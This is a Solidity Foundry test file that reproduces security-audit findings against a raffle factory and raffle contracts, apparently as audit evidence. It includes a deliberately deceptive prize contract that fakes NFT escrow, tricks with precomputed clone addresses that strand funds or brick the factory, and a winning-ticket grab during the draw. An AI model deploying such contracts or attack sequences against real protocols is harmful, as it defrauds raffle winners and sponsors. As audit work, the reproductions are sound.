// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

// Post-seal local reproductions for the Anthropic lane's reconciled root causes (r001).
// Each test demonstrates current behaviour of the frozen source; it is evidence, not a fix.

import { Test } from "forge-std/Test.sol";
import { RaffleFactory } from "../src/RaffleFactory.sol";
import { Raffle } from "../src/Raffle.sol";
import { IRaffle } from "../src/interfaces/IRaffle.sol";
import { IRaffleFactory } from "../src/interfaces/IRaffleFactory.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import { LaneUSDC, LanePrize, LaneVRFWrapper } from "./mocks/LaneMocks.sol";

/// Prize contract that reports escrow without ever holding the token (sponsor-controlled hostile prize).
contract LyingPrize {
    mapping(uint256 => address) public fakeOwner;
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
    function ownerOf(uint256 id) external view returns (address) { return fakeOwner[id]; }
    function safeTransferFrom(address from, address to, uint256 id) external {
        // no token moves; just satisfy the raffle's receiver hook and lie about ownership
        IERC721Receiver(to).onERC721Received(msg.sender, from, id, "");
        fakeOwner[id] = to;
    }
    function transferFrom(address, address, uint256) external { /* silently does nothing */ }
}

/// Honest-looking prize with an admin pause (models pausable / validator-restricted collections).
contract PausablePrize is LanePrize {
    bool public paused;
    function setPaused(bool p) external { paused = p; }
    function _update(address to, uint256 id, address auth) internal override returns (address) {
        require(!paused || to == address(0), "paused");
        return super._update(to, id, auth);
    }
}

contract LaneReproTest is Test {
    LaneUSDC usdc;
    LanePrize prize;
    LaneVRFWrapper wrapper;
    RaffleFactory factory;
    address constant TREASURY = address(0x7EA5);
    address constant SPONSOR = address(0x5905);
    address constant SREC = address(0x5EC1);
    address constant A = address(0xA11CE);
    address constant B = address(0xB0B);

    function setUp() public {
        vm.warp(1_700_000_000);
        usdc = new LaneUSDC();
        prize = new LanePrize();
        wrapper = new LaneVRFWrapper();
        factory = new RaffleFactory(address(usdc), address(wrapper), TREASURY);
        vm.prank(SPONSOR);
        prize.setApprovalForAll(address(factory), true);
    }

    function _create(address prizeAddr, uint256 id, address srec, uint128 reserve) internal returns (Raffle r) {
        vm.prank(SPONSOR);
        r = Raffle(payable(factory.createRaffle(IRaffleFactory.CreateRaffleParams({
            sponsorRecipient: srec, prizeToken: prizeAddr, prizeTokenId: id, reserveEntries: reserve,
            endTime: uint64(block.timestamp + 1 days)
        }))));
    }

    function _buy(Raffle r, address who, uint128 n) internal {
        usdc.mint(who, uint256(n) * 1e6);
        vm.prank(who);
        usdc.approve(address(r), uint256(n) * 1e6);
        vm.prank(who);
        r.buyEntries(who, n);
    }

    function _resolve(Raffle r, uint256 word) internal {
        vm.warp(r.endTime());
        vm.deal(A, 1 ether);
        vm.prank(A);
        r.requestDraw{ value: 0.001 ether }();
        wrapper.fulfill(r.vrfRequestId(), word);
    }

    /// RC-1: a sponsorRecipient equal to a not-yet-deployed clone address passes every creation-time screen; once that
    /// clone exists, releaseSponsorPrize moves the prize NFT into another clone, and sponsor USDC is stranded.
    function test_RC1_counterfactualCloneRecipient() public {
        prize.mint(SPONSOR, 1);
        prize.mint(SPONSOR, 2);
        uint256 nonce = vm.getNonce(address(factory));
        address futureClone = vm.computeCreateAddress(address(factory), nonce + 1);
        Raffle a = _create(address(prize), 1, futureClone, 100);
        Raffle b = _create(address(prize), 2, SREC, 1);
        assertEq(address(b), futureClone);
        assertTrue(factory.isRaffle(futureClone));
        _buy(a, A, 10);
        _resolve(a, 0); // 10 < 100 -> CashWon
        assertEq(uint8(a.status()), uint8(IRaffle.Status.CashWon));
        a.settleWinningTicket(1);
        a.releaseSponsorPrize(); // no payout-time screen on the prize leg
        assertEq(prize.ownerOf(1), address(b), "prize moved into another clone");
        vm.expectRevert(abi.encodeWithSelector(IRaffle.InvalidQuoteDestination.selector, address(b)));
        a.releaseSponsorProceeds(); // stranded permanently (immutable recipient)
        // other legs unaffected
        vm.prank(A);
        a.redeemWinningTicket(1);
        a.releaseProtocolFees();
        assertEq(b.prizeTokenId(), 2);
    }

    /// RC-2: a protocol treasury equal to a future clone address makes that createRaffle revert for good.
    function test_RC2_treasuryFutureCloneBricksFactory() public {
        address deployer = address(0xDE);
        uint256 dn = vm.getNonce(deployer);
        address predictedFactory = vm.computeCreateAddress(deployer, dn);
        // factory nonce 1 deploys the implementation; first clone is CREATE(factory, 2)
        address firstClone = vm.computeCreateAddress(predictedFactory, 2);
        vm.prank(deployer);
        RaffleFactory f = new RaffleFactory(address(usdc), address(wrapper), firstClone);
        assertEq(address(f), predictedFactory);
        prize.mint(SPONSOR, 7);
        vm.prank(SPONSOR);
        prize.setApprovalForAll(address(f), true);
        for (uint256 i; i < 2; i++) {
            vm.prank(SPONSOR);
            (bool ok,) = address(f).call(abi.encodeCall(f.createRaffle, (IRaffleFactory.CreateRaffleParams({
                sponsorRecipient: SREC, prizeToken: address(prize), prizeTokenId: 7, reserveEntries: 1,
                endTime: uint64(block.timestamp + 1 days)
            }))));
            assertFalse(ok, "createRaffle should keep reverting at the same nonce");
        }
        assertEq(f.raffleCount(), 0);
    }

    /// RC-3a: a sponsor-controlled prize contract fakes escrow; reserve met -> NftWon; sponsor + treasury are paid 100%
    /// of the pot while the winner receives nothing of value (transferFrom is a no-op and ownerOf lies).
    function test_RC3a_lyingPrizeSponsorPaidWinnerGetsNothing() public {
        LyingPrize lp = new LyingPrize();
        Raffle r = _create(address(lp), 1, SREC, 3);
        assertEq(uint8(r.status()), uint8(IRaffle.Status.Active)); // passes factory escrow verification
        _buy(r, A, 5);
        _resolve(r, 0);
        assertEq(uint8(r.status()), uint8(IRaffle.Status.NftWon));
        r.settleWinningTicket(1);
        r.releaseSponsorProceeds();
        r.releaseProtocolFees();
        assertEq(usdc.balanceOf(SREC), 4_750_000);
        assertEq(usdc.balanceOf(TREASURY), 250_000);
        // Winner "redeems": the lying contract no-ops transferFrom; ownerOf(1) still reports the raffle, so redemption reverts.
        vm.prank(A);
        vm.expectRevert();
        r.redeemWinningTicket(1);
        assertEq(usdc.balanceOf(address(r)), 0, "nothing left for the winner");
    }

    /// RC-3b: an honest collection whose admin pauses transfers after creation strands the NftWon winner, while the
    /// sponsor and treasury still collect 100% of the pot.
    function test_RC3b_pausedHonestPrize() public {
        PausablePrize pp = new PausablePrize();
        pp.mint(SPONSOR, 1);
        vm.prank(SPONSOR);
        pp.setApprovalForAll(address(factory), true);
        Raffle r = _create(address(pp), 1, SREC, 2);
        _buy(r, A, 4);
        _resolve(r, 0);
        pp.setPaused(true);
        r.settleWinningTicket(1);
        r.releaseSponsorProceeds();
        r.releaseProtocolFees();
        vm.prank(A);
        vm.expectRevert(bytes("paused"));
        r.redeemWinningTicket(1);
        assertEq(pp.ownerOf(1), address(r));
        assertEq(usdc.balanceOf(SREC) + usdc.balanceOf(TREASURY), 4_000_000);
    }

    /// RC-4: tickets stay transferable while Drawing; anyone who sees the fulfilment word can identify and acquire
    /// the winning ticket before the callback executes (here: B buys A's ticket off-chain and receives it).
    function test_RC4_transferDuringDrawing() public {
        prize.mint(SPONSOR, 1);
        Raffle r = _create(address(prize), 1, SREC, 1);
        _buy(r, A, 1);
        _buy(r, B, 1); // ticket 2 = entry 2
        vm.warp(r.endTime());
        vm.deal(A, 1 ether);
        vm.prank(A);
        r.requestDraw{ value: 0.001 ether }();
        uint256 word = 1; // pending fulfilment reveals: entry = 1 % 2 + 1 = 2 -> ticket 2
        uint256 winningTicket = (word % 2) + 1 == 1 ? 1 : 2;
        vm.prank(B);
        r.transferFrom(B, A, winningTicket); // ownership change while Drawing is allowed
        wrapper.fulfill(r.vrfRequestId(), word);
        vm.prank(A);
        r.redeemWinningTicket(winningTicket);
        assertEq(prize.ownerOf(1), A);
    }

    /// RC-5: the sponsor can cancel an empty raffle before endTime; others only from endTime.
    function test_RC5_sponsorEarlyCancelEmpty() public {
        prize.mint(SPONSOR, 1);
        Raffle r = _create(address(prize), 1, SREC, 1);
        vm.prank(A);
        vm.expectRevert();
        r.enableRefunds();
        vm.prank(SPONSOR);
        r.enableRefunds();
        r.releaseSponsorPrize();
        assertEq(prize.ownerOf(1), SREC);
    }
}
